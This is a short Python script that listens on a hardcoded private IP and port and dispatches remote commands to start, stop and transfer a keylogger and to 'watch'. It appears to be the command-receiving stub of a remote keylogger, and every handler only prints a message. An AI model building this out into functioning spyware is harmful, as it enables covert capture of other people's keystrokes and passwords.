from socket import socket, AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET
from constants import *

address = ("10.65.108.146", 8000)
backlog = 5
buffsize = 1024

listening_socket = socket(AF_INET, SOCK_STREAM)
listening_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
listening_socket.bind(address)
listening_socket.listen(backlog)
command_socket, addr = listening_socket.accept()

print("Connection from: ", addr)
while True:
    msg_bytes = command_socket.recv(buffsize)
    if not msg_bytes:
        print("Host disconected!")
        print("quitting...")
        break
    command = msg_bytes.decode("utf-8")
    if command == START_KEYLOGGER:
        print("received start keylogger command!")
    if command == STOP_KEYLOGGER:
        print("received stop keylogger command!")
    if command == TRANSFER_KEYLOGGER:
        print("received transfer keylogger command!")
    if command == QUIT:
        print("received quit command!")
        print("quitting...")
        break
    if command.split(" ")[0] == WATCH:
        print("received watch command: " + command)
command_socket.close()
listening_socket.close()
